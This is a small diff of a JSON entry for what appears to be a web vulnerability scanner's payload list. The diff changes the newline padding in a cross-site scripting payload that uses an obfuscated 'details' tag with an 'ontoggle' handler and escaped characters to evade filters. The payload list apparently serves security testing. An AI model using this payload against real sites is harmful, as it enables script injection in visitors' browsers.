@@ -3,7 +3,7 @@
 "Scanner":1,
 "Author":"@egarme",
 "Payloads":["\u003cdETAILS%0aopen%0aonToGgle%0a\u003d%0aa\u003dprompt,
-\n\na() x\u003e"],
+\n\n\n\na() x\u003e"],
 "Encoder":[],
 "UrlEncode":false,
 "CharsToUrlEncode":"",
